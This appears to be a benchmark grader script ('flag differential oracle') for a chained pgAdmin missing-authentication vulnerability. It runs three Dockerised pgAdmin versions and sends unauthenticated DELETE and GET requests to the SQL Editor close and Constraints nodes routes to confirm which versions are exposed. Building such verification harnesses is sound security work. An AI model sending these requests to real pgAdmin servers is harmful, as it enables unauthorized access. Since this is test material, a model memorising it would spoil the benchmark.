#!/usr/bin/env python3
"""Flag differential oracle for pgadmin-cve-2026-17348.

Chain: CVE-2026-12046 (unauthenticated reach of SQL Editor close/update
       routes; @pga_login_required added in 9.16, commit f81433a)
    -> CVE-2026-17348 (same omission on Constraints nodes/proplist/delete,
       preferences.get_all_cli, debugger.close, schema_diff.close; closed
       in 9.17, commit 24fdcf0)

V0 = pgAdmin 9.15  (sqleditor close/update have no auth decorator)
V1 = pgAdmin 9.16  (12046 fixed; constraints routes still undecorated) <- target
V2 = pgAdmin 9.17  (17348 fixed: constraints routes decorated)

Canary = the auth-gate status class, exactly as the upstream regression
test (web/pgadmin/tools/sqleditor/tests/test_close_requires_auth.py)
defines it: BLOCKED = status in (301, 302, 401, 403) (login redirect /
unauthorized); REACHED = any other response (the route body ran).

seed:     DELETE /sqleditor/close/<trans_id> unauthenticated (CSRF only)
residual: GET  /browser/constraints/nodes/<gid>/<sid>/<did>/<scid>/<tid>/
"""
from __future__ import annotations

import argparse
import json
import os
import secrets
import subprocess
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
import pgadm_util as u  # noqa: E402

FLAG = os.environ.get("PCB_FLAG") or f"PCBFLAG_{secrets.token_hex(8)}"


def seed_exploit(*, version="v0") -> dict:
    if not u.wait_ready(version):
        return {"ok": False, "status": 0, "body": "env not ready"}
    s = u.anonymous_session(version)
    r = s.delete(u.BASE[version] + "/sqleditor/close/424242", timeout=20, allow_redirects=False)
    return {"ok": u.is_reached(r), "status": r.status_code, "body": r.text[:200]}


def residual_exploit(*, version="v1") -> dict:
    if not u.wait_ready(version):
        return {"ok": False, "status": 0, "body": "env not ready"}
    s = u.anonymous_session(version)
    r = s.get(
        u.BASE[version] + "/browser/constraints/nodes/1/1/1/1/1/", timeout=20,
        allow_redirects=False
    )
    return {"ok": u.is_reached(r), "status": r.status_code, "body": r.text[:200]}


def gate() -> dict:
    s0 = seed_exploit(version="v0")
    s1 = seed_exploit(version="v1")
    r1 = residual_exploit(version="v1")
    r2 = residual_exploit(version="v2")
    return {
        "seed_open_on_v0": s0["ok"],
        "seed_closed_on_v1": not s1["ok"],
        "residual_reaches_flag_on_v1": r1["ok"],
        "residual_blocked_on_v2": not r2["ok"],
        "seed_v0_status": s0["status"],
        "seed_v1_status": s1["status"],
        "residual_v1_status": r1["status"],
        "residual_v2_status": r2["status"],
        "passed": all([s0["ok"], not s1["ok"], r1["ok"], not r2["ok"]]),
    }


def _compose(*args, env=None):
    return subprocess.run(
        ["docker", "compose", *args], cwd=str(HERE), text=True,
        capture_output=True, check=False,
        env={**os.environ, **(env or {})},
    )


def run_gate(profiles=("v0", "v1", "v2"), keep_up=False) -> dict:
    global FLAG
    FLAG = os.environ.get("PCB_FLAG") or f"PCBFLAG_{secrets.token_hex(8)}"
    env = {"PCB_FLAG": FLAG}
    all_profiles = ["--profile", "v0", "--profile", "v1", "--profile", "v2"]
    _compose(*all_profiles, "down", "-v", env=env)
    r = _compose(*all_profiles, "up", "-d", env=env)
    if r.returncode != 0:
        return {"error": "compose up failed", "stderr": r.stderr[-2000:]}
    result = gate()
    result["_flag"] = FLAG
    if not keep_up:
        _compose(*all_profiles, "down", "-v", "--rmi", "all", env=env)
    return result


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--run-gate", action="store_true")
    ap.add_argument("--keep-up", action="store_true")
    a = ap.parse_args()
    if a.run_gate:
        print(json.dumps(run_gate(keep_up=a.keep_up), indent=2))
    else:
        print(json.dumps(gate(), indent=2))
